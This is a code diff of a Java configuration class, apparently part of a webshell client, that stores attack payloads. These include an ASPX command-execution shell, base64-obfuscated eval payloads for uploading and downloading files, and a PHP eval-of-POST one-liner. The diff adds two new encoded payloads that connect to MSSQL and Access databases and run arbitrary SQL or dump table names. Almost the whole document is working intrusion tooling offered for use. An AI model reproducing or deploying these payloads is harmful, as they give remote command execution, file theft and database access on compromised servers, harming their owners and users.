@@ -65,8 +65,8 @@ public class InitConfig {
 		config.setValue("ASPX_SHELL", "var c=new System.Diagnostics.ProcessStartInfo(Request.Item[\\\"z1\\\"]);var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments=\\\"/c \\\"%2bRequest.Item[\\\"z2\\\"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd()%2bEI.ReadToEnd());");
 		config.setValue("ASPX_UPLOAD", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"dmFyIFA6U3RyaW5nPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTt2YXIgWjpTdHJpbmc9UmVxdWVzdC5JdGVtWyJ6MiJdO3ZhciBLOlN0cmluZz1SZXF1ZXN0Lkl0ZW1bInozIl07dmFyIEI6Ynl0ZVtdPW5ldyBieXRlW1ouTGVuZ3RoLzJdO2Zvcih2YXIgaT0wO2k8Wi5MZW5ndGg7aSs9Mil7QltpLzJdPWJ5dGUoQ29udmVydC5Ub0ludDMyKFouU3Vic3RyaW5nKGksMiksMTYpKTt9dmFyIGZzOlN5c3RlbS5JTy5GaWxlU3RyZWFtO2lmKEs9PSIxIil7ZnM9bmV3IFN5c3RlbS5JTy5GaWxlU3RyZWFtKFAsU3lzdGVtLklPLkZpbGVNb2RlLkNyZWF0ZSk7fWVsc2V7ZnM9bmV3IFN5c3RlbS5JTy5GaWxlU3RyZWFtKFAsU3lzdGVtLklPLkZpbGVNb2RlLkFwcGVuZCk7fWZzLldyaXRlKEIsMCxCLkxlbmd0aCk7ZnMuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZSgiMSIpOw%3D%3D\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
 		config.setValue("ASPX_DOWNLOAD", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"UmVzcG9uc2UuV3JpdGVGaWxlKFJlcXVlc3QuSXRlbVsiejEiXSk7\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
-		
-		
+		config.setValue("ASPX_DB_MSSQL1", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"dmFyIENvbm49bmV3IEFjdGl2ZVhPYmplY3QoIkFkb2RiLmNvbm5lY3Rpb24iKTt2YXIgc3RyU1FMOlN0cmluZz1TeXN0ZW0uVGV4dC5FbmNvZGluZy5HZXRFbmNvZGluZyg2NTAwMSkuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MiJdKSk7Q29ubi5Db25uZWN0aW9uU3RyaW5nPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTtDb25uLkNvbm5lY3Rpb25UaW1lb3V0PTEwO0Nvbm4uT3BlbigpO2lmKHN0clNRTD09IiIpe3ZhciBScz1Db25uLk9wZW5TY2hlbWEoMjApO3ZhciB4OlN0cmluZz0iIjt3aGlsZSghUnMuRU9GICYmICFScy5CT0Ype2lmKFJzLkZpZWxkcygzKS5WYWx1ZT09IlRBQkxFIil7eCs9UnMuRmllbGRzKDIpLlZhbHVlKyJcdCI7fVJzLk1vdmVOZXh0KCk7fVJzLkNsb3NlKCk7Q29ubi5DbG9zZSgpO1Jlc3BvbnNlLldyaXRlKHgpO31lbHNle3ZhciBDTzpTdHJpbmc9Ilx0fFx0IixSTjpTdHJpbmc9IlxyXG4iLERhdDpTdHJpbmc7dmFyIFJzPUNvbm4uRXhlY3V0ZShzdHJTUUwpO3ZhciBpOkludDMyPVJzLkZpZWxkcy5Db3VudCxjOkludDMyO2ZvcihjPTA7YzxpO2MrKyl7UmVzcG9uc2UuV3JpdGUoUnMuRmllbGRzKGMpLk5hbWUrQ08pO31SZXNwb25zZS5Xcml0ZShSTik7d2hpbGUoIVJzLkVPRiAmJiAhUnMuQk9GKXtmb3IoYz0wO2M8aTtjKyspe0RhdD1Scy5GaWVsZHMoYykuVmFsdWU7UmVzcG9uc2UuV3JpdGUoRGF0KTtSZXNwb25zZS5Xcml0ZShDTyk7fVJlc3BvbnNlLldyaXRlKFJOKTtScy5Nb3ZlTmV4dCgpO31Db25uLkNsb3NlKCk7fQ%3D%3D\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
+		config.setValue("ASPX_DB_MDB","Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"dmFyIENvbm49bmV3IEFjdGl2ZVhPYmplY3QoIkFkb2RiLmNvbm5lY3Rpb24iKTt2YXIgc3RyU1FMOlN0cmluZz1TeXN0ZW0uVGV4dC5FbmNvZGluZy5HZXRFbmNvZGluZyg2NTAwMSkuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MiJdKSk7Q29ubi5Db25uZWN0aW9uU3RyaW5nPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTtDb25uLkNvbm5lY3Rpb25UaW1lb3V0PTEwO0Nvbm4uT3BlbigpO2lmKHN0clNRTD09IiIpe3ZhciBScz1Db25uLk9wZW5TY2hlbWEoMjApO3ZhciB4OlN0cmluZz0iIjt3aGlsZSghUnMuRU9GICYmICFScy5CT0Ype2lmKFJzLkZpZWxkcygzKS5WYWx1ZT09IlRBQkxFIil7eCs9UnMuRmllbGRzKDIpLlZhbHVlKyJcdHxcdFxyXG4iO31Scy5Nb3ZlTmV4dCgpO31Scy5DbG9zZSgpO0Nvbm4uQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZSh4KTt9ZWxzZXt0cnl7dmFyIENPOlN0cmluZz0iXHR8XHQiLFJOOlN0cmluZz0iXHJcbiIsRGF0OlN0cmluZzt2YXIgUnM9Q29ubi5FeGVjdXRlKHN0clNRTCk7dmFyIGk6SW50MzI9UnMuRmllbGRzLkNvdW50LGM6SW50MzI7Zm9yKGM9MDtjPGk7YysrKXtSZXNwb25zZS5Xcml0ZShScy5GaWVsZHMoYykuTmFtZStDTyk7fVJlc3BvbnNlLldyaXRlKFJOKTt3aGlsZSghUnMuRU9GICYmICFScy5CT0Ype2ZvcihjPTA7YzxpO2MrKyl7RGF0PVJzLkZpZWxkcyhjKS5WYWx1ZTtSZXNwb25zZS5Xcml0ZShEYXQpO1Jlc3BvbnNlLldyaXRlKENPKTt9UmVzcG9uc2UuV3JpdGUoUk4pO1JzLk1vdmVOZXh0KCk7fUNvbm4uQ2xvc2UoKTt9Y2F0Y2goRXhjZXB0aW9uKXtDb25uLkNsb3NlKCk7fX0=\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
 		
 		config.setValue("PHP_BASE64", "1");
 		config.setValue("PHP_MAKE", "@eval\u0001(base64_decode($_POST[action]));");
@@ -95,7 +95,7 @@ public class InitConfig {
 		config.setValue("JSP_UPLOAD", "G");
 		config.setValue("JSP_DOWNLOAD", "F");
 		config.setValue("JSP_SHELL", "M");
-		config.setValue("JSP_DB_MYSQL", "com.mysql.jdbc.Driver%0D%0Ajdbc%3Amysql%3A%2F%2Flocalhost%2Ftestdb%3Fuser%3Dusername%26password%3Duserpwd");
+		config.setValue("JSP_DB_MYSQL", "com.mysql.jdbc.Driverchoraheiheiheijdbc%3Amysql%3A%2F%2Flocalhost%2Ftestdb%3Fuser%3Dusername%26password%3Duserpwd");
 
 		
 		
@@ -180,7 +180,10 @@ public class InitConfig {
 		Safe.ASPX_UPLOAD = config.getValue("ASPX_UPLOAD");
 		Safe.ASPX_DOWNLOAD = config.getValue("ASPX_DOWNLOAD");
 		Safe.ASPX_SHELL = config.getValue("ASPX_SHELL");
-
+		//sjs db
+		Safe.ASPX_DB_MSSQL1 = config.getValue("ASPX_DB_MSSQL1");
+		Safe.ASPX_DB_MDB = config.getValue("ASPX_DB_MDB");
+		
 		Safe.CUS_BASE64 = config.getValue("CUS_BASE64");
 		Safe.CUS_MAKE = config.getValue("CUS_MAKE");
 		Safe.CUS_INDEX = config.getValue("CUS_INDEX");
